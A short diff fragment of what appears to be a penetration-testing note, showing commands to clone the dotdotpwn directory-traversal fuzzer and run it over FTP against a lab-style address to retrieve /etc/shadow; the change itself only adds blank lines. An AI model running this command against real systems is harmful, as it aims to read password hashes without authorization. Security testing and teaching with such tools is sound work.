@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:07.601958+00:00'
 git clone https://github.com/wireghoul/dotdotpwn
 perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
 ```
+
+
